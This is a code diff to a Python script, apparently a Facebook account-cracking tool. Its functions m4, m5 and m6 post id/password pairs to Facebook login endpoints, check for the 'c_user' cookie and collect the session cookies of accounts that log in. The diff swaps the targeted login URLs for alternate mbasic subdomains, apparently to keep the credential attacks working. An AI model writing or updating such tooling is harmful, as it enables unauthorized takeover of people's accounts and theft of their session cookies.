@@ -1163,7 +1163,7 @@ def m4(idf,pwv):
     'DNT': '1',
     'Pragma': 'no-cache',
     'TE': 'Trailers', }#'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',}
-   lo = session.post('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+   lo = session.post('https://mbasic.alpha.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -1237,7 +1237,7 @@ def m5(idf,pwv):
     'DNT': '1',
     'Pragma': 'no-cache',
     'TE': 'Trailers', }#'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',}
-   lo = session.post('https://ko-kr.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data=log_data,headers=header_freefb).text
+   lo = session.post('https://mbasic.beta.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -1324,7 +1324,7 @@ def m6(idf,pwv):
     'DNT': '1',
     'Pragma': 'no-cache',
     'TE': 'Trailers', }
-   lo = session.post('https://ko-kr.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data=log_data,headers=header_freefb).text
+   lo = session.post('https://mbasic.prod.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
